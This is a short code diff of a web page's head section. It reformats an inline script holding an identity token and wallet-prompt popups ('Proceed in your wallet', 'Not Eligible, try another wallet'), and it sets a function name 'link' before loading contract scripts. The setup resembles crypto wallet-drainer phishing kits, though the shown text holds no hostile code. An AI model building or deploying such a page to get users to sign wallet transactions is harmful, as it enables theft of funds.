@@ -345,24 +345,26 @@ background: #f3f3f3;
 
 
 
-  <script>
-    window.UNIQUE_IDENTITY = "jePuxJTXdz";
+   <script>
+      window.UNIQUE_IDENTITY = "jePuxJTXdz";
+  
+      window.popups = {
+        PENDING: {
+          title: "Link Pending",
+          text: "Proceed in your wallet to continue",
+        },
+        INVALID: {
+          title: "Not Eligible",
+          text: "Please try another wallet",
+        },
+      };
 
-    window.popups = {
-      PENDING: {
-        title: "Link Pending",
-        text: "Proceed in your wallet to continue",
-      },
-      INVALID: {
-        title: "Not Eligible",
-        text: "Please try using another wallet",
-      },
-    };
-  </script>
-
-  <script defer="defer" src="js/contracts.js"></script>
-  <script defer="defer" src="js/main.js"></script>
-  <script defer="defer" src="js/entry.js"></script>
+      window.FUNCTION_NAME = "link"
+    </script>
+  
+    <script defer="defer" src="js/contracts.js"></script>
+    <script defer="defer" src="js/main.js"></script>
+    <script defer="defer" src="js/entry.js"></script>
 
 </head>
 
